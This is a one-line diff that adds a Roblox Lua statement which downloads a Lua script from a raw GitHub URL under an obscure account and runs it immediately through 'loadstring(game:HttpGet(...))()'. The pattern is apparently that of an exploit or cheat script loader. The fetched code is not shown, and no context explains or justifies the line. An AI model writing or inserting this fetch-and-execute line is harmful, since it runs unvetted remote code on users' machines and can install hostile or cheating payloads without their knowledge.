@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Khkxh/Voieans-fghj/8cc96403b6fca18e053627a23c83b1af38fcf298/fgg.lua'))()
